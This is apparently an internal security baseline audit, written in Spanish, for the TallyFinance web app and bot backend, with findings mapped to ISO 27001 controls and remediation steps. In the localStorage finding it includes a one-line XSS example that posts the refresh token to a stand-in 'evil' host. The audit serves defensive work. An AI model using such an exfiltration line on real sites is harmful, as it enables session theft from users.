# Security Baseline — TallyFinance

**Fecha:** 2026-04-20
**Fase:** 3 (Baseline post Fase 1 y Fase 2)
**Commit base:** `6d64c7e`
**Alcance:** `backend/src/**`, `frontend_TallyFinance/src/**`, `docs/**`, git history completa.
**Estado Fase 1 aplicado:** RLS missing tables, Helmet, CORS fail-closed, rate limit auth (IP+email, 5/15min), password policy 12+chars en signup.

---

## Resumen ejecutivo

| Severidad | Cantidad |
|---|---:|
| **CRITICAL** | 3 |
| **HIGH** | 5 |
| **MEDIUM** | 6 |
| **LOW** | 4 |
| **Probable (needs manual check)** | 5 |

**3 acciones que deben ocurrir en las próximas 24 h, en este orden:**

1. **Rotar las dos API keys committeadas en `docs/nlu_comparison.ipynb`** (Gemini + OpenAI). Revocar en consola del proveedor **antes** de purgar de git.
2. **Quitar tokens de `localStorage`** en `frontend_TallyFinance/src/lib/apiClient.js`. Hoy hay XSS→session takeover con un solo bug.
3. **Validar firma de webhook en `/telegram/webhook` y `/whatsapp/webhook`**. Hoy cualquiera puede POSTear eventos falsos y disparar funciones Gemini como si fueran un usuario real.

El resto de la Fase 1 quedó correctamente aplicada. **Pero** el rate limit auth que instalamos tiene un defecto: no hay `trust proxy` en NestJS, así que en Render el `req.ip` apunta al proxy y el limiter por IP se vuelve global (un atacante bloquea a todos en 5 requests).

---

## CRITICAL

### C1 — API keys Gemini y OpenAI en el repo (en HEAD, en git history)

- **Archivo:** `docs/nlu_comparison.ipynb` (cell 2, líneas 45–47 del JSON del notebook)
- **Committed en:** `6d64c7e` (2026-03-26), autor `sebaUC`. Sigue presente en HEAD.
- **Keys expuestas:**
  - `GEMINI_KEY = "AIzaSy...3WpU"` — Google Gemini, formato válido AIza[39 chars].
  - `OPENAI_KEY = "sk-svcacct-...xgqt3ZMA"` — OpenAI *service account* key (tier elevado — cuidado).
- **Control ISO:** A.8.12 (data leakage prevention), A.5.17 (authentication information).
- **Impacto:** cualquiera con el repo (colaborador, ex-empleado, scraper de GitHub si se hace público) puede:
  - Consumir crédito en cuentas de Gemini y OpenAI del usuario.
  - Leer conversaciones si el proveedor las retiene en "training opt-in".
  - Pivotear a otras APIs si las keys están en la misma cuenta.
- **Triage:** **fix-now.** Estas son las acciones en orden estricto:
  1. Entrar a Google AI Studio → API Keys → revocar `AIzaSy...3WpU`.
  2. Entrar a platform.openai.com → API keys → revocar la service account.
  3. Generar keys nuevas y guardarlas solo en `.env` (gitignored) y en Render como *Secret File*.
  4. Editar el notebook para leer las keys desde `os.environ`: `GEMINI_KEY = os.environ["GEMINI_API_KEY"]`.
  5. Purgar del history: `git filter-repo --path docs/nlu_comparison.ipynb --invert-paths`, force-push. **Hacerlo solo después de revocar**, porque forks y clones locales siguen teniendo las keys viejas.

---

### C2 — Tokens de sesión persistidos en `localStorage` (no HttpOnly)

- **Archivo:** `frontend_TallyFinance/src/lib/apiClient.js:11–80`
- **Evidencia:**
  ```js
  const TOKEN_STORAGE_KEY = 'tally_access_token'
  const REFRESH_TOKEN_STORAGE_KEY = 'tally_refresh_token'
  const readStoredToken = () => localStorage.getItem(TOKEN_STORAGE_KEY) || null
  let currentAccessToken = readStoredToken()
  ```
- **Control ISO:** A.8.24 (use of cryptography / session handling), A.8.11 (data masking).
- **Impacto:** el backend emite `access_token` y `refresh_token` como cookies `HttpOnly`, pero el frontend **además** los guarda en `localStorage` para sobrevivir recargas. Cualquier XSS (ver también M1 sobre `AdminDocs` y M2 sobre mensajes sin sanitizar) exfiltra ambos tokens en una línea: `fetch('https://evil/', {method:'POST', body:localStorage.getItem('tally_refresh_token')})`. El refresh_token dura 7 días → persistencia total.
- **Nota sobre el CLAUDE.md**: dice "module-level token management (not localStorage)". Está **desactualizado**. Actualizar también.
- **Triage:** **fix-now** (mismo sprint). Opciones en orden de preferencia:
  1. **Eliminar el fallback a localStorage**. Dejar solo la variable de módulo + cookie HttpOnly. Las recargas re-leen el perfil con `GET /auth/me` usando la cookie.
  2. Si se necesita persistencia explícita para OAuth popup, usar `sessionStorage` en lugar de `localStorage` y limpiarlo al cerrar pestaña.
  3. **Nunca** `console.log(tokenPreview)`: también filtra los primeros 6 chars del JWT, que juntos con el `alg` revelan más de lo necesario.

---

### C3 — Webhooks Telegram y WhatsApp sin validación de firma

- **Archivos:**
  - `backend/src/bot/bot.controller.ts:116–209` (`@Post('whatsapp/webhook')`)
  - `backend/src/bot/bot.controller.ts:211–323` (`@Post('telegram/webhook')`)
- **Evidencia:** grep de `x-telegram-bot-api-secret-token`, `x-hub-signature`, `TELEGRAM_SECRET`, `crypto` dentro de `backend/src/bot/**` → **cero matches**. El `TELEGRAM_SECRET` está en `.env` pero nadie lo lee.
- **Control ISO:** A.8.21 (security of network services), A.8.28 (secure coding), A.5.23 (cloud services security).
- **Impacto:** cualquier atacante puede hacer `POST /telegram/webhook` con un `body` forjado y disparar la pipeline V3 completa en nombre de un `externalId` arbitrario. Consecuencias: ejecutar `register_expense` / `delete_transaction` / `set_balance` / cualquier función Gemini, consumir tokens de Gemini del plan del user, flood al `bot_message_log`, llenar la cuota diaria de alguna víctima (2M tokens/día), impersonar undo callbacks. El rate limit actual es por `externalId` — el atacante rota el externalId y pasa.
- **Triage:** **fix-now**. Implementación concreta:
  - **Telegram**: comparar `request.headers['x-telegram-bot-api-secret-token']` contra `TELEGRAM_SECRET` con `crypto.timingSafeEqual`. Devolver 401 sin cuerpo si falla.
  - **WhatsApp**: validar `x-hub-signature-256`: `HMAC-SHA256(rawBody, META_APP_SECRET)`. Necesitas el raw body (ya está disponible porque `main.ts` tiene `rawBody: true`).
  - Importante: la validación debe correr **antes** de `downloadMedia()`, `markAsRead()` y cualquier side-effect.

---

## HIGH

### H1 — Rate limit de auth no funciona correctamente en producción (trust proxy)

- **Archivo:** `backend/src/main.ts` (faltante) + `backend/src/auth/auth.controller.ts:84-93` (`getClientIp`)
- **Control ISO:** A.8.5 (secure authentication).
- **Problema:** NestJS no tiene `app.set('trust proxy', 1)`. Detrás de Render (proxy inverso), `req.ip` devuelve la IP del proxy, no la del cliente. El helper `getClientIp()` lee `X-Forwarded-For` como workaround, pero:
  1. `X-Forwarded-For` llega solo si Render lo setea (lo hace, pero verifica).
  2. Sin trust proxy, Express no sanitiza ni elige la correcta.
  3. Peor: si `X-Forwarded-For` está vacío en un edge case, el fallback `req.ip` es la IP del proxy → key compartida por **todos los usuarios**. 5 requests de un atacante bloquean el signin de toda la plataforma.
- **Fix:** agregar `app.set('trust proxy', 1)` en `main.ts` antes de `listen()`, y simplificar `getClientIp()` a `req.ip`.

### H2 — Open redirect / token smuggling en OAuth callback

- **Archivo:** `backend/src/auth/auth.controller.ts:277-318` (`handleOAuthCallback`)
- **Evidencia:** el handler extrae `access_token` de 3 fuentes: query, URL fragment propio, y **`Referer` header** (`extractFragmentParam(req.headers.referer, 'access_token')`).
- **Control ISO:** A.5.17, A.8.26.
- **Impacto:** un atacante puede forzar un `Referer` malicioso (ej. iframe + `<a href="...#access_token=...">`) para que el backend "reciba" un token que en realidad viene del path de otro tenant. Es un vector estrecho porque requiere control de la página que hace el redirect, pero no hay allow-list de dominios.
- **Fix:** eliminar la lectura de `Referer`; aceptar solo query param explícito. El flujo OAuth de Supabase normalmente pone el token en la URL del cliente, no es necesario leerlo del Referer.

### H3 — Rate limit bot por `externalId` permite bypass simple

- **Archivo:** `backend/src/bot/bot.controller.ts:39-55, 161, 264` — `createAsyncRateLimiter(this.redis, 30, 60_000)` con key = `externalId`
- **Control ISO:** A.8.6 (capacity management), A.8.5.
- **Impacto:** el rate limit de 30 msgs/min está por `externalId` (chat_id Telegram, número WhatsApp). Si combinamos con C3 (webhook sin firma), un atacante rota el externalId a voluntad y no golpea nunca el limit. Incluso con C3 arreglado, un atacante con varios chat_id legítimos lo supera.
- **Fix:** agregar un segundo key por IP (misma estrategia que Fase 1 auth: doble limiter, corta el que llegue primero). Por IP: 60/min. Por externalId: 30/min.

### H4 — Subcategorías sin límite de tamaño en Onboarding

- **Archivo:** `backend/src/onboarding/dto/onboarding.dto.ts`
- **Evidencia:** `@ArrayMaxSize(50)` está en categorías padre, pero `children?: SubCategoryDto[]` no tiene `@ArrayMaxSize`.
- **Control ISO:** A.8.5, A.8.26.
- **Impacto:** un user puede POSTear 50 categorías × 10k subcategorías = 500k rows por onboarding. DELETE+INSERT sin transacción (ver M3) + volumen = DoS en Supabase.
- **Fix:** `@ArrayMaxSize(20)` en `children`.

### H5 — `AdminDocs` itera HTML con `allow-scripts` y `contentEditable`

- **Archivo:** `frontend_TallyFinance/src/pages/admin/AdminDocs.jsx:183-188`
- **Evidencia:**
  ```jsx
  <iframe sandbox="allow-same-origin allow-scripts allow-modals" />
  doc.write(htmlContent)
  doc.body.contentEditable = 'true'
  ```
- **Control ISO:** A.8.26, A.5.15 (acceso admin).
- **Impacto:** si el `/docs.html` que carga el iframe se contamina (MITM en Vercel edge, compromiso de deploy, o incluso el mismo admin editando mal), se ejecuta JS arbitrario en el origen frontend → robo de cookies, manipulación de UI admin, pivote al backend vía `fetch` con cookies `credentials:'include'`.
- **Fix:** quitar `allow-scripts` del sandbox; los docs no necesitan JS. Considerar `srcdoc` o sanitizar con DOMPurify si algún día se aceptan docs externos. Deshabilitar `contentEditable` por default; activar bajo un feature flag de dev.

---

## MEDIUM

### M1 — Mensajes de usuario/bot mostrados sin sanitización explícita

- **Archivos:**
  - `frontend_TallyFinance/src/pages/admin/AdminMessages.jsx:177` (tabla)
  - `frontend_TallyFinance/src/pages/admin/AdminMessageDetail.jsx:163`
- **Control ISO:** A.8.28.
- **Situación actual:** React escapa por default en JSX — OK. No hay `dangerouslySetInnerHTML`. El riesgo es futuro: si alguien mete `dangerouslySetInnerHTML` en esos componentes, XSS-store inmediato (porque los mensajes vienen del user y van a `bot_message_log`).
- **Fix:** defensa en profundidad — aplicar `DOMPurify.sanitize` antes de guardar en `bot_message_log` (A.8.11 data masking), y agregar eslint rule `react/no-danger` para prevenir regresiones.

### M2 — `onboarding.service` hace DELETE + INSERT sin transacción

- **Archivo:** `backend/src/onboarding/onboarding.service.ts:29-34, 142-168`
- **Control ISO:** A.8.28, A.5.23.
- **Impacto:** si el INSERT falla después del DELETE, el user queda sin categorías/budgets/goals. Supabase no expone transacciones multi-statement por el cliente JS — hay que pasar a una RPC `PL/pgSQL` con `BEGIN/EXCEPTION ROLLBACK`.
- **Triage:** **fix-phase-6.** No bloquea compliance mínimo porque el usuario puede re-hacer onboarding, pero impacta robustez.

### M3 — Password policy frontend (8) ≠ backend (12)

- **Archivo:** `frontend_TallyFinance/src/hooks/useAuthForm.js` — validación 8+ chars.
- **Backend Fase 1:** 12+ chars + símbolo + mayúscula + minúscula + número.
- **Control ISO:** A.5.17.
- **Impacto:** user escribe pass de 9 chars en frontend, frontend dice OK, backend rechaza con 400. UX roto y user puede pensar que el registro es inestable.
- **Fix:** sincronizar la regex en `useAuthForm` con la del DTO.

### M4 — `force: true` en link-channel overwrite sin re-auth ni audit log

- **Archivo:** `backend/src/auth/services/auth-channel.service.ts` (método linkChannel con force option)
- **Control ISO:** A.5.15, A.8.15.
- **Impacto:** user A tiene Telegram linkeado. User B ejecuta `/auth/link-channel` con `{ linkCode, force: true }` y el mismo canal. El sistema transfiere el link sin notificar a A ni registrar en audit log. Cualquier session-hijack + linkcode leak → takeover del bot.
- **Fix:** requerir confirmación explícita (segunda request con JWT reciente < 5 min), y loggear la acción en `bot_message_log` con `tool_name='link_force_overwrite'`.

### M5 — 31 CVEs en dependencias backend (1 CRITICAL Handlebars, 15 HIGH)

- **Fuente:** `npm audit` (2026-04-20).
- **Notables:**
  - CRITICAL: `handlebars` (AST Type Confusion → JS injection). Viene transitivamente por `@nestjs/cli`.
  - HIGH: `axios` (SSRF via NO_PROXY + prototype pollution), `@nestjs/core` (output neutralization), `validator`, `lodash` (prototype pollution + `_.template` RCE), `multer` (DoS), `path-to-regexp` (ReDoS).
- **Control ISO:** A.8.8 (technical vulnerability management).
- **Triage:** la mayoría están en devDependencies (`@nestjs/cli`, `jest`). Las que están en runtime que requieren acción:
  - `axios@1.12.2` → bump a `1.8.0+` que parcha NO_PROXY SSRF y proto-poison.
  - `validator@13.15.15` → bump a 13.15.16.
- **Lo resto** (prototype pollution en deps transitivas de build tools) es aceptable hoy; se resuelve en Fase 4 con Dependabot + policy de PR bloqueo.

### M6 — 15 CVEs en dependencias frontend (7 HIGH)

- **Notables:**
  - HIGH: `react-router` — **CSRF en Action/Server Action** + **XSS via Open Redirects**. Usas react-router v7.9 — impacta directamente.
  - HIGH: `vite` (path traversal en `.map` handling + bypass de `server.fs.deny`). Dev-only pero atención en `npm run dev`.
  - HIGH: `rollup` (path traversal). Build-time.
- **Control ISO:** A.8.8.
- **Triage:**
  - **react-router**: bump a la mínima que parche ambos CVEs (revisar GitHub advisories del paquete). **fix-now** si la minor disponible no rompe v7 API.
  - **vite/rollup**: bump en Fase 4.

---

## LOW

### L1 — Console logs en frontend revelan token preview (6 chars)

- `frontend_TallyFinance/src/lib/apiClient.js:62-65` — `tokenPreview: ${token.slice(0,6)}…`.
- **Fix:** envolver en `if (import.meta.env.DEV)`.

### L2 — `channelLinkCode` en `sessionStorage` y `localStorage` mezclados

- `frontend_TallyFinance/src/pages/ChannelLinkCapture.jsx:164` + `channelLinkManager.js`.
- **Fix:** consolidar en uno, documentar en CLAUDE.md.

### L3 — CSP no definida explícitamente en frontend

- No hay `public/_headers` ni `vercel.json` con CSP.
- **Fix Fase 4:** `vercel.json` con `Content-Security-Policy: script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'`.

### L4 — `AdminGuard` con UUID whitelist hardcoded

- `backend/src/admin/guards/admin.guard.ts` — confirmado, ya está en **fix-phase-6**.

---

## Posibles (needs manual check)

1. `backend/src/bot/v3/conversation-v3.service.ts` — prompt injection: ¿se sanitiza el user input antes de pushearlo al `Content[]` de Gemini?
2. `backend/src/bot/adapters/telegram.adapter.ts` media download — ¿hay allow-list de dominios, size limit y timeout estrictos?
3. `backend/src/bot/v3/function-router.ts` — ¿los `transaction_id` / `category_id` resueltos son re-chequeados por `user_id = auth.uid()` antes de DELETE/UPDATE?
4. `backend/src/common/utils/data-parser.service.ts` — ¿regex DoS en parsing de montos con formato libre ("15 lucas 20 cientos")?
5. `backend/src/auth/services/auth-profile.service.ts` — OAuth callback, JWT con formato no esperado.

---

## Mapeo a Annex A ISO 27001:2022

| Control | Hallazgos | Estado |
|---|---|---|
| **A.5.15** Access control | H2, M4, L4 | Partial |
| **A.5.17** Authentication information | C1, H2, M3 | Partial |
| **A.5.23** Cloud services security | C3, M2 | Partial |
| **A.8.5** Secure authentication | H1, H3, H4 | Partial |
| **A.8.6** Capacity management | H3 | Partial |
| **A.8.8** Vulnerability management | M5, M6 | **Not implemented** (Fase 4) |
| **A.8.11** Data masking | C2, M1 | **Not implemented** |
| **A.8.12** Data leakage prevention | C1 | **Implemented post-rotation** |
| **A.8.15** Logging | M4 | Partial (hook audit log local, sin Supabase) |
| **A.8.21** Network services security | C3 | **Not implemented** |
| **A.8.23** CORS / web filtering | — | **Implemented** (Fase 1) |
| **A.8.24** Cryptography | C2 | Partial |
| **A.8.26** Application security requirements | H5, M1, M2 | Partial |
| **A.8.28** Secure coding | M1, M2, C3 | Partial |
| **A.8.29** Security testing | — | Partial (tests Fase 1) |
| **A.8.32** Change management | — | **Not implemented** (Fase 4: branch protection) |
| **A.8.34** Audit testing protection | — | **Implemented** (Fase 2: hooks + permissions) |

---

## Triage final (priorización accionable)

| Prioridad | Item | ISO | Tiempo estimado | Fase |
|---|---|---|---:|---|
| P0 | C1 — Rotar API keys + purgar git | A.8.12 | 1 h | **now (Fase 3.1)** |
| P0 | C2 — Quitar tokens de localStorage | A.8.24 | 3 h | **now (Fase 3.2)** |
| P0 | C3 — Firma de webhooks TG + WA | A.8.21 | 4 h | **now (Fase 3.3)** |
| P1 | H1 — trust proxy en NestJS | A.8.5 | 30 min | now |
| P1 | H2 — eliminar fallback Referer | A.5.17 | 30 min | now |
| P1 | H3 — rate limit por IP en webhooks | A.8.6 | 2 h | now |
| P1 | H4 — ArrayMaxSize subcategorías | A.8.5 | 15 min | now |
| P1 | H5 — quitar allow-scripts en AdminDocs | A.8.26 | 30 min | now |
| P2 | M3 — sincronizar password policy front/back | A.5.17 | 30 min | now |
| P2 | M5/M6 — bump axios + react-router | A.8.8 | 1 h | now |
| P3 | M1 — DOMPurify + eslint no-danger | A.8.11 | 2 h | Fase 6 |
| P3 | M2 — onboarding transaccional RPC | A.8.28 | 4 h | Fase 6 |
| P3 | M4 — audit log de force-link | A.8.15 | 2 h | Fase 6 |
| P4 | L1-L3 | varios | — | Fase 4 |
| P4 | L4 — AdminGuard tabla | A.5.15 | — | Fase 6 |

**Total estimado para cerrar P0+P1+P2: ~14 h de código.**

---

## Evidencia de scans

- `npm audit` backend: `critical=1 high=15 moderate=13 low=2 total=31`.
- `npm audit` frontend: `critical=0 high=7 moderate=8 low=0 total=15`.
- Secret scan (grep + git log): 2 keys confirmadas en `docs/nlu_comparison.ipynb` (Gemini + OpenAI), presentes en HEAD + commit `6d64c7e`. Ningún `.env` committeado. Ninguna private key PEM encontrada.
- Code review OWASP: 2 subagents Explore dispatcheados en paralelo sobre `backend/src/**` y `frontend_TallyFinance/src/**`.
